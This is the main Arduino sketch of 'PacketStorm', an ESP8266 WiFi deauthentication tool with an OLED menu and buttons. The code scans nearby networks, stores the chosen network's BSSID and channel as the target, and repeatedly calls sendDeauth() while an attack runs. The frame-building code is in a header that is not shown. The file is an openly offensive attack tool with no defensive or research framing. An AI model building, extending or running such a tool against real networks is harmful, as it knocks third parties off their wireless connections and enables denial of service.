/*
 * PacketStorm
 * An ESP8266-based WiFi deauthentication tool with OLED display and button controls.
 * Author - WireBits
 */

#include <Wire.h>
#include "scan.h"
#include "menu.h"
#include "deauth.h"
#include <ESP8266WiFi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define BTN_UP     14
#define BTN_DOWN   12
#define BTN_SELECT 13

#define OLED_RESET -1
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

enum MenuState { MAIN_MENU, SELECT_MENU, DEAUTH_MENU };
MenuState menuState = MAIN_MENU;

int mainOption = 0;
int selectOption = 0;
int deauthOption = 0;
int scrollOffset = 0;

String selectedNetwork = "";

void setup() {
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_SELECT, INPUT_PULLUP);
    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
        while (true);
    }
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(30, 28);
    display.println("PacketStorm");
    display.display();
    delay(2000);
}

void loop() {
    display.clearDisplay();
    switch (menuState) {
        case MAIN_MENU:
            showMainMenu(mainOption);
            break;
        case SELECT_MENU:
            showSelectMenu(selectOption, scrollOffset, networkCount);
            break;
        case DEAUTH_MENU:
            showDeauthMenu(selectedNetwork, deauthOption, deauthRunning);
            break;
    }
    display.display();
    bool up = digitalRead(BTN_UP) == LOW;
    bool down = digitalRead(BTN_DOWN) == LOW;
    bool select = digitalRead(BTN_SELECT) == LOW;
    if (up || down) {
        int direction = down ? 1 : -1;
        switch (menuState) {
            case MAIN_MENU:
                mainOption = (mainOption + direction + 2) % 2;
                break;
            case SELECT_MENU:
                selectOption = constrain(selectOption + direction, 0, networkCount);
                scrollOffset = constrain(selectOption - 3, 0, max(0, networkCount - 4));
                break;
            case DEAUTH_MENU:
                deauthOption = (deauthOption + direction + 3) % 3;
                break;
        }
        delay(200);
    }
    if (select) {
        switch (menuState) {
            case MAIN_MENU:
                if (mainOption == 0) startWiFiScan();
                else {
                    menuState = SELECT_MENU;
                    selectOption = scrollOffset = 0;
                }
                break;
            case SELECT_MENU:
                if (selectOption == networkCount) {
                    menuState = MAIN_MENU;
                } else {
                    selectedNetwork = scannedNetworks[selectOption].ssid;
                    memcpy(targetBSSID, scannedNetworks[selectOption].bssid, 6);
                    targetChannel = scannedNetworks[selectOption].channel;
                    menuState = DEAUTH_MENU;
                    deauthOption = 0;
                }
                break;
            case DEAUTH_MENU:
                switch (deauthOption) {
                    case 0: startDeauth(selectOption); break;
                    case 1: if (deauthRunning) stopDeauth(); break;
                    case 2: menuState = MAIN_MENU; break;
                }
                break;
        }
        delay(500);
    }
    if (deauthRunning) {
        sendDeauth();
    }
}
